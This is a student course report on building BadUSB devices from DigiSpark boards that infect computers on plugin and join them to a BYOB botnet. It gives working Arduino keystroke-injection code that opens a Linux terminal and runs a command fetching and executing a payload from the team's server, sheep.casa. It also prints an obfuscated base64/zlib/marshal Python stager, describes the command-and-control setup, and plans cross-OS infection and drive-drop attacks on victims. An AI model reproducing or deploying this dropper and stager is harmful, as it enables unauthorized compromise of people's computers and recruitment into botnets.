# CSUS CSC154: Project Midterm Report

## Objective  
The objective of this project is to create BadUSB devices, that upon plugin, infect victim computers with malware configured to join a botnet.

### BadUSB  
To create our BadUSB devices we'll be using the [DigiSpark](http://digistump.com/products/1) development board by [Digistump](http://digistump.com/). These devices will be reconized as USB keyboards by the victims' machines, and will execute keystrokes to deliver our payload.

### Botnet  
For our botnet we're currently still exploring a handful of open source frameworks. The leading contender at the moment is [Build Your Own Botnet](https://github.com/malwaredllc/byob). Other frameworks we're looking into include [GoBot2](https://github.com/SaturnsVoid/GoBot2), [UBoat](https://github.com/Souhardya/UBoat), and [Loki](https://github.com/Pure-L0G1C/Loki). There may be other frameworks we explore as they're discovered. Our ultimate goal is an easily deployed and managed *command and control server*, and the ability to generate cross platform compatible clients.


## Progress  

### DigiSpark  
Thus far, we've purchased our BadUSB (DigiSpark) devices via Amazon. We have 12 of these devices spread across our members. They cost about $3 dollars each. 

![amazon](./images/amazon.png)
**Figure 1:** DigiSpark boards on Amazon.

In order to program our USB devices we've installed the [Arduino IDE](https://www.arduino.cc/en/Main/Software).  
![arduino_download](./images/arduino_download.png)
**Figure 2:** Download the Arduino IDE.

We've then configured the Arduino IDE to include the DigiSpark board, so that we may use the `DigiKeyboard.h` library.   
![digistump_json](./images/digistump_json.png)
**Figure 3:** Add DigiStump board manager url to configuration.

![digistump_boardmanager](./images/digistump_boardmanager.png)
**Figure 4:** Board manager downloading DigiStump's board libraries.

![digistump_default](./images/digistump_setboard.png)
**Figure 5:** Set board to Digispark Default.

The following code is what we've developed thus far to infect Linux machines upon plugin.

```c
#include "DigiKeyboard.h"

/**
 * 
 * This is an attack for Linux machines, but it's more of a
 * proof of concept right now.
 *
**/

void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_T , MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(600);
  
  DigiKeyboard.print("cd /tmp && wget https://sheep.casa/payloads/linux_payload.py && python ./linux_payload.py");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}


void loop() {
  
}
```

As you can see above, the code delays for two seconds to allow the machine to register the device. After that it executes keystrokes to open up the terminal, and waits .6 seconds. Next it executes shell commands to navigate to the `/tmp` directory, download the appropriate payload from our server, and execute it.


### Command and Control Server  
* [Digital Ocean](https://digitalocean.com)
* [Domain Name](https://sheep.casa)
* [BYOB](https://github.com/malwaredllc/byob)

We've created a VPS on Digital Ocean to run our C&C server. We're using an Ubuntu 18.04 droplet at the cost of $5 per month. Additionally, we've purchased the domain `sheep.casa`, and directed it towards our C&C server.

![digitalocean](./images/digitalocean.png)
**Figure 6:** Botnet C&C server droplet on Digital Ocean.


In order to host our payloads, we've installed Apache 2 to host our files.

![sheep](./images/sheep.png)
**Figure 7:** ASCII sheep, just for fun.

![payload_directory](./images/payload_directory.png)
**Figure 8:** `/payloads` directory hosting our malicious files.


### Payloads
* Linux




Below is our `linux_payload.py` file generated by BYOB.
```python
import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmBgYCgtyskvSM3TUM8oKSmw0tcvzkhNLdBLTixOtDI0NrYACpQkpqcWFesXJCfqFVSqa+oVpSamaGgCAFaFE3g=')))))
```


## Todo
We've yet to configure our BadUSB devices to infect Windows or OSX machines. Additionally, we need to develop payloads for Windows and OSX to deliver via our BadUSB devices once they're configured. Across the team we should already have computers running each OS to begin our development. 

Ideally, the same BadUSB device would be able to infect Windows, OSX, and Linux. However, we're still uncertain that this is technically achievable given the way USB functions. Currently we do not have knowledge of how to detect which operating system a victim's computer is running. We may need to configure different devices to be plugged in depending on the victim's machine. However, we will still explore how one device may be used to infect all OS(s). An option we're exploring is simply loading all of our payloads onto one device, and attempting to execute each of them quietly until the machine is infected.

A different device per OS would be perfectly acceptable in an attack scenario in which the attacker has physical access to the victim's machine. The devices are cheap and small, so carrying three of them should be no issue. However, for attack scenarios in which the drive is left in a public place for a victim to find, the ability to infect any OS would greatly improve the success rate.

